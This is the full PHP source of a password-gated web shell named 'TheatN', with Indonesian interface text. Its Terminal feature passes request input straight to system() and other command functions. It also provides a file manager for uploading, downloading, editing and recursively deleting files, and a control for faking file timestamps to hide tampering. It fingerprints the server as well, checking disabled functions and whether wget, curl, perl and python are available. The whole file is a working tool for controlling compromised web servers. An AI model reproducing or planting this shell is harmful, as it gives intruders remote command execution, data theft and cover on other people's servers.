<?php
session_start();
error_reporting(0);
set_time_limit(0);

// Password MD5
$md5_password = md5("msverse");

if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $md5_password) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "Password salah!";
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>TheatN</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #2e2e2e;
                color: #ffffff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 70vh;
            }
            .login-container {
                background-color: #333333;
                padding: 15px;
                border-radius: 5px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
                display: grid;
                place-items: center;
                height: 9vh;
            }
            .login-container h2 {
                margin-bottom: 20px;
                display: grid;
                place-items: center;
                height: 2vh;
            }
            .login-container input[type="password"] {
                width: 86%;
                padding: 5px;
                margin: 5px 0;
                border: none;
                border-radius: 4px;
            }
            .login-container input[type="submit"] {
                width: 90%;
                padding: 10px;
                background-color: #4CAF50;
                border: none;
                color: white;
                border-radius: 4px;
                cursor: pointer;
            }
            .login-container input[type="submit"]:hover {
                background-color: #45a049;
            }
            .error {
                color: #f44336;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Welcome</h2>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Login">
            </form>
            <footer>
            <p>Copyright by <a href="https://msversee.blogspot.com/">msverse</a> 2024</p>
            </footer>
            <?php
            if (isset($error)) {
                echo '<div class="error">' . $error . '</div>';
            }
            ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}
?>
<?php
error_reporting(0);
set_time_limit(0);

function perms($file) {
    $perms = fileperms($file);

    switch ($perms & 0xF000) {
        case 0xC000: // socket
            $info = 's';
            break;
        case 0xA000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = '-';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default: // unknown
            $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);

if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['tmp_name'] as $key => $tmp_name) {
        $name = $_FILES['files']['name'][$key];
        $tmp_name = $_FILES['files']['tmp_name'][$key];
        if (move_uploaded_file($tmp_name, "$path/$name")) {
            echo "Upload Berhasil: $name<br/>";
        } else {
            echo "Upload Gagal: $name<br/>";
        }
    }
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    }
}

if (isset($_POST['delete'])) {
    $delete_path = $_POST['delete'];
    if (is_dir($delete_path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($delete_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }
        rmdir($delete_path);
    } else {
        unlink($delete_path);
    }
}

if (isset($_POST['rename'])) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (rename($old_name, $new_name)) {
        echo "Rename berhasil<br/>";
    } else {
        echo "Rename gagal<br/>";
    }
}

if (isset($_POST['edit'])) {
    $file_path = $_POST['file_path'];
    $content = $_POST['content'];
    if (file_put_contents($file_path, $content)) {
        echo "Edit file berhasil<br/>";
    } else {
        echo "Edit file gagal<br/>";
    }
}

if (isset($_POST['change_time'])) {
    $file_path = $_POST['file_path'];
    $new_time = strtotime($_POST['new_time']);
    if (touch($file_path, $new_time, $new_time)) {
        echo "Waktu file berhasil diubah<br/>";
    } else {
        echo "Gagal mengubah waktu file<br/>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TheatN</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        @font-face {
            font-family: 'Pure Heart';
            src: url('https://raw.githubusercontent.com/MSVerse/TheatN/master/PureHeart-Regular.ttf') format('truetype');           
        }
        body {
            font-family: Arial, sans-serif;
            background: url(https://i.ibb.co.com/yY8pFD5/anime-girl-pink-hair-tongue-out-4k-wallpaper-uhdpaper-com-218-3-a.jpg) no-repeat center center fixed;        
        }
        h1 {
            font-family: 'Pure Heart', Arial, sans-serif;
            font-size: 50px;
            display: grid;
            place-items: center;
            height: 3vh;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        a {
            color: #4CAF50;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .button {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
        }
        .button-red {
            background-color: #f44336;
        }
        .fiture {
        margin: 5px;
        }
        
        .text-center {
        text-align: center;
        }
        
        .text-white {
        color: white;
        }
        
        .d-flex {
        display: flex;
        }
        
        .justify-content-center {
        justify-content: center;
        }
        
        .flex-wrap {
        flex-wrap: wrap;
        }
        
        .form-control {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border: none;
        border-radius: 4px;
        background-color: #2e2e2e;
        color: #ffffff;
        }
        
        hr {
        border: 1px solid #4CAF50;
        }
        
        hr.divider {
        margin: 20px 0;
        }
        
        .col-lg-8 {
        max-width: 800px;
        margin: auto;
        }
        
        .btn {
        border-radius: 4px;
        padding: 10px 20px;
        font-size: 14px;
        color: #ffffff;
        text-decoration: none;
        display: inline-block;
        margin: 5px;
        }
        
        .btn-danger {
        background-color: #f44336;
        }
        
        .btn-warning {
        background-color: #ff9800;
        }
        
        .btn-sm {
        padding: 5px 10px;
        font-size: 12px;
        }
    </style>
</head>
<body>
<?php
	function exe($cmd) {
		if(function_exists('system')) {
			@ob_start();
			@system($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('exec')) {
			@exec($cmd,$results);
			$buff = "";
			foreach($results as $result) {
				$buff .= $result;
			} return $buff;
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$buff = @ob_get_contents();
			@ob_end_clean();
			return $buff;
		} elseif(function_exists('shell_exec')) {
			$buff = @shell_exec($cmd);
			return $buff;
		}
	}
$os = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ver = phpversion();
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
$total = formatSize(disk_total_space($path));
$free = formatSize(disk_free_space($path));
$total1 = disk_total_space($path);
$free1 = disk_free_space($path);
$used = formatSize($total1 - $free1);

function formatSize($bytes) {
    $types = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return round($bytes, 2) . " " . $types[$i];
}
?>
<h1>T h e a t N</h1>
<table>
    <tr>
        <td><i class="fa fa-code"></i> PHP</td>
        <td> : <?php echo $ver; ?></td>
    </tr>
    <tr>
        <td><i class="fa fa-server"></i> IP Server</td>
        <td> : <?php echo $ip; ?></td>
    </tr>
    <tr>
        <td><i class="fa fa-hdd"></i> HDD</td>
        <td>Total : <?php echo $total; ?> <br/> Free : <?php echo $free; ?> [<?php echo $used; ?>]</td>
    </tr>
    <tr>
       <p><strong>Safe Mode:</strong> <?php echo $sm; ?> | <strong>Disable Functions:</strong> <?php echo $show_ds; ?></p>
    </tr>
    <tr>
       <p><strong>MySQL:</strong> <?php echo $mysql; ?> | <strong>Python:</strong> <?php echo $python; ?> | <strong>Perl:</strong> <?php echo $perl; ?> | <strong>Wget:</strong> <?php echo $wget; ?> | <strong>cURL:</strong> <?php echo $curl; ?></p>  
    </tr>
    <tr>
        <td><i class="fa fa-desktop"></i> Sistem Operasi</td>
        <td> : <?php echo $os; ?></td>
    </tr>
<tr>
    <td><i class="fa fa-map"></i> Map</td>
    <td>: 
        <?php
        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                echo '<a href="?path=/">/</a>';
                continue;
            }
            if ($pat == '') continue;
            echo '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                echo "$paths[$i]";
                if ($i != $id) echo "/";
            }
            echo '">' . $pat . '</a>/';
        }
        ?>
    </td>
</tr>
</table>

<?php
echo '
<hr>
<div class="text-center">
    <div class="d-flex justify-content-center flex-wrap">
        <a href="?" class="fiture btn btn-danger btn-sm"><i class="fa fa-home"></i> Home</a>
        <a href="?path='.$path.'&go=terminal" class="fiture btn btn-danger btn-sm"><i class="fa fa-terminal"></i> Terminal</a>
        <a href="?disclaimer" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> Disclaimer</a>
        <a href="?keluar" class="fiture btn btn-warning btn-sm"><i class="fa fa-sign-out"></i> Exit</a>
    </div>
</div>
<div class="col-lg-8"><hr/>';

//cmd
if ($_GET['go'] == 'terminal') {
    echo '<h5><i class="fa fa-terminal"></i> : ~$</h5>
    <form>
        <input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | whoami | pwd">
    </form>';
}
if (isset($_GET['cmd'])) {
    echo "<pre>";
    echo system($_GET['cmd']);
    echo "</pre>";
    exit;
}

//keluar
if (isset($_GET['keluar'])) {
    session_start();
    session_destroy();
    echo '<script>window.location="?";</script>';
}

//about
if (isset($_GET['disclaimer'])) {
    echo '<center><h3>TheatN</h3></center><br>Segala tindakan dan aktivitas yang berkaitan dengan materi yang terdapat dalam alat ini sepenuhnya menjadi tanggung jawab <b>Anda</b>. Pengembang tidak bertanggung jawab atas segala kerugian atau kerusakan yang disebabkan oleh penyalahgunaan informasi dalam alat ini yang dapat berakibat pada tuntutan pidana yang diajukan terhadap orang yang bersangkutan.<br><br>Note: Modifikasi atau perubahan pada kode ini diperbolehkan, namun rilis publik yang menggunakan kode ini harus disetujui oleh penulis alat ini (<a href="https://msversee.blogspot.com/">msverse</a>)';
    exit;
}
?>
    <form enctype="multipart/form-data" method="POST">
        <input type="file" name="files[]" multiple>
        <input type="submit" value="Upload">
    </form>    
    <?php
    if (isset($_GET['filesrc'])) {
        $file = $_GET['filesrc'];
        echo "<h2>Melihat File: " . htmlspecialchars(basename($file)) . "</h2>";
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    } elseif (isset($_GET['edit'])) {
        $file = $_GET['edit'];
        echo "<h2>Mengedit File: " . htmlspecialchars(basename($file)) . "</h2>";
        echo '<form method="POST">
            <textarea name="content" rows="20" cols="80">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br/>
            <input type="hidden" name="file_path" value="' . $file . '">
            <input type="submit" name="edit" value="Save">
        </form>';
    } else {
        echo '<table>';
        echo '<tr><th>Name</th><th>Size</th><th>Permission</th><th>Last Modified</th><th>Creation Time</th><th>Action</th></tr>';

        $scandir = scandir($path);
        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo '<tr>
                <td><i class="fa fa-folder"></i> <a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
                <td><center>--</center></td>
                <td><center>';
            if (is_writable("$path/$dir")) echo '<font color="lime">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
            echo '</center></td>
                <td><center>' . date("d-M-Y H:i", filemtime("$path/$dir")) . '</center></td>
                <td><center>' . date("Y-m-d H:i:s", filectime("$path/$dir")) . '</center></td>
                <td><center>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="delete" value="' . "$path/$dir" . '">
                        <input type="submit" value="D" class="button button-red">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="old_name" value="' . "$path/$dir" . '">
                        <input type="text" name="new_name" placeholder="Nama Baru">
                        <input type="submit" name="rename" value="R" class="button">
                    </form>
                </center></td>
            </tr>';
        }

        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue;
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }
            echo '<tr>
                <td><i class="fa fa-file"></i> <a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
                <td><center>' . $size . '</center></td>
                <td><center>';
            if (is_writable("$path/$file")) echo '<font color="lime">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo '</center></td>
                <td><center>' . date("d-M-Y H:i", filemtime("$path/$file")) . '</center></td>
                <td><center>' . date("Y-m-d H:i:s", filectime("$path/$file")) . '</center></td>
                <td><center>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="delete" value="' . "$path/$file" . '">
                        <input type="submit" value="D" class="button button-red">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="old_name" value="' . "$path/$file" . '">
                        <input type="text" name="new_name" placeholder="Nama Baru">
                        <input type="submit" name="rename" value="R" class="button">
                    </form>
                    <form method="GET" style="display:inline;">
                        <input type="hidden" name="edit" value="' . "$path/$file" . '">
                        <input type="submit" value="E" class="button">
                    </form>
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="file_path" value="' . "$path/$file" . '">
                        <input type="text" name="new_time" placeholder="Waktu Baru (Y-m-d H:i:s)">
                        <input type="submit" name="change_time" value="T" class="button">
                    </form>
                    <a href="?download=' . $path . '/' . $file . '" class="button">D</a>
                </center></td>
            </tr>';
        }
        echo '</table>';
    }
    ?>  
    <footer>
    <p><i class="fa fa-copyright"></i> Copyright by <a href="https://msversee.blogspot.com/">msverse</a> 2024</p>
    </footer>
</body>
</html>
